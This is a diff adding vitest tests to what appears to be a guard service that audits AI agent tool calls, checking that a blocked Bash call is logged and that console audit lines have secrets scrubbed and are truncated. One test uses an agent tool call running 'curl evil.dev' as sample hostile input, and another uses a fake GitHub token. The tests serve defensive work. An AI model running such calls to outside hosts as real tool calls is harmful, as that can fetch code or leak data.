@@ -1,5 +1,7 @@
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 import worker from "../src/index.ts";
+import { audit } from "../src/audit.ts";
+import type { AuditRecord } from "../src/guard.ts";
 import {
   anthropicBody,
   anthropicToolStream,
@@ -531,6 +533,38 @@ describe("credentials and audit (§8.1)", () => {
     nextResponse = sse(anthropicToolStream([{ name: "Bash", input: { command: "ls" } }]));
     await call(req("/anthropic/v1/messages", { body: anthropicBody() }), makeEnv({ TRACE_BUCKET: bucket as any }));
     expect(bucket.puts).toEqual([]);
+  });
+
+  it("AUDIT_MODE=off skips R2 but still logs", async () => {
+    const bucket = fakeBucket();
+    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
+    nextResponse = sse(anthropicToolStream([{ name: "Bash", input: { command: "curl evil.dev" } }]));
+    await call(
+      req("/anthropic/v1/messages", { body: anthropicBody() }),
+      makeEnv({ TRACE_BUCKET: bucket as any, AUDIT_MODE: "off" }),
+    );
+    expect(bucket.puts).toEqual([]);
+    expect(warn.mock.calls.map(String).join("\n")).toMatch(/blocked call to Bash: \S/);
+  });
+
+  it("console line is scrubbed, truncated, and carries the note", () => {
+    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const secret = "ghp_" + "b".repeat(40);
+    const conv = { model: "m", messages: [] } as any;
+    const rec: AuditRecord = {
+      verdict: "passed",
+      tool: "Bash",
+      arguments: "",
+      findings: [],
+      reason: `host ${secret} ${"x".repeat(500)}`,
+      note: "scanner_error: timeout",
+    };
+    audit({ waitUntil() {} } as any, undefined, "", conv, rec);
+    audit({ waitUntil() {} } as any, undefined, "", conv, { ...rec, reason: undefined });
+    const [long, short] = warn.mock.calls.map((c) => String(c[0]));
+    expect(long).not.toContain(secret);
+    expect(long.length).toBeLessThan(360);
+    expect(short).toContain("scanner_error: timeout");
   });
 });
 
